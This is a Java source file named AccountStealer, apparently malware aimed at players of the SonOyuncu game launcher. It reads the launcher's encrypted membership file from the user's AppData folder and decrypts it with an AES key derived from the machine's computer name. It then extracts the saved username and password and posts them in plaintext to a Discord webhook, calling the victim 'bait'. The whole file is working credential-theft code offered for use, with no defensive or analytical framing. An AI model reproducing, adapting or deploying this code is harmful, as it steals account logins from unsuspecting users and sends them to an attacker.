package io.github.itzgonza.impl;

import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.net.URL;

import javax.crypto.Cipher;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;
import javax.net.ssl.HttpsURLConnection;

import org.apache.commons.codec.binary.Base64;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

/**
 * @author ItzGonza
 */
public class AccountStealer {
	
	public transient static AccountStealer instance;

	private transient String username, password, webhookURL, membershipPath;
	{
		username = new String("empty");
		password = new String("empty");
		webhookURL = new String("ur_webhook_url");
		membershipPath = new String(String.format("C:/Users/%s/Appdata/Roaming/.sonoyuncu/sonoyuncu-membership.json", System.getProperty("user.name")));
	};
	
	public void initialize() throws Exception {
		setUsername(new String(tools.in.getDecryptJson(membershipPath).get("sonOyuncuUsername").getAsString().getBytes(), "utf-8"));
		setPassword(new String(tools.in.getDecryptJson(membershipPath).get("sonOyuncuPassword").getAsString().getBytes(), "utf-8"));
    	
		synchronized ("Webhook Sender") {
			HttpsURLConnection connection = (HttpsURLConnection) new URL(webhookURL).openConnection();
			connection.addRequestProperty("Content-Type", "application/json");
			connection.addRequestProperty("User-Agent", "itzgonza1337.cu");
			connection.setRequestMethod("POST");
			connection.setDoOutput(true);
	    	
			connection.getOutputStream().write(String.format("{\"username\": \"eu#1337\", \"avatar_url\": \"https://cdn.discordapp.com/avatars/852809396538048573/da5b04860ebdde2d95d9c7b44c239944.png?size=2048\", \"content\": \"\", \"embeds\": [{\"title\": \"SonOyuncu Account Stealer :dash:\", \"color\":65505, \"description\": \"a new bait has been spotted :woozy_face:\\n\\n:small_blue_diamond:Username **%s**\\n:small_blue_diamond:Password **%s**\", \"timestamp\": null, \"author\": {\"name\": \"\", \"url\": \"\"}, \"image\":{\"url\": \"\"}, \"thumbnail\":{\"url\": \"https://www.minotar.net/avatar/%s\"}, \"footer\": {\"text\": \"github.com/itzgonza\", \"icon_url\": \"https://avatars.githubusercontent.com/u/61884903?v=4\"}, \"fields\": []}], \"components\": []}", getUsername(), new String(Base64.decodeBase64(getPassword())), getUsername()).getBytes());
	    	
			connection.getOutputStream().close();
			connection.getInputStream().close();
		};
    	
	}
    
	private String getUsername() {
		if ((username != "") & (username != null)) {
			return username;
		}
		return (new NullPointerException().getMessage());
	}

	private String getPassword() {
		if ((password != "") & (password != null)) {
			return password;
		}
		return (new NullPointerException().getMessage());
	}

	private void setUsername(String username) {
		if ((username != "") & (username != null)) {
			this.username = username;
		}
		else System.err.println("username == \"\" & username == null");
	}
	
	private void setPassword(String password) {
		if ((password != "") & (password != null)) {
			this.password = password;
		}
		else System.err.println("password == \"\" & password == null");
	}
	
	enum tools {
			
		in;
		
		private JsonObject getDecryptJson(String path) throws Exception {
			if (!new File(path).isFile()) return null;

			DataInputStream dataInputStream = new DataInputStream(new FileInputStream(new File(path)));
			if (dataInputStream.read() != 31) return null;
			
			byte[] array = new byte[8];
			dataInputStream.read(array, 0, array.length);
	         
			byte[] array2 = new byte[dataInputStream.readInt()];
			dataInputStream.read(array2, 0, array2.length);
	         
			byte[] array3 = new byte[1024];
			ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
	         
			int read;
			while ((read = dataInputStream.read(array3, 0, array3.length)) != -1) {
				byteArrayOutputStream.write(array3, 0, read);
			}
			
			SecretKeySpec secretKeySpec = new SecretKeySpec(SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256").generateSecret(new PBEKeySpec(System.getenv("computerName").toCharArray(), array, 65536, 128)).getEncoded(), "AES");
			
			Cipher instance = Cipher.getInstance("AES/CBC/PKCS5Padding");
			instance.init(2, secretKeySpec, new IvParameterSpec(array2));

			return JsonParser.parseString(new String(instance.doFinal(byteArrayOutputStream.toByteArray()), "utf-8")).getAsJsonObject();
		}
		
	}
	
}
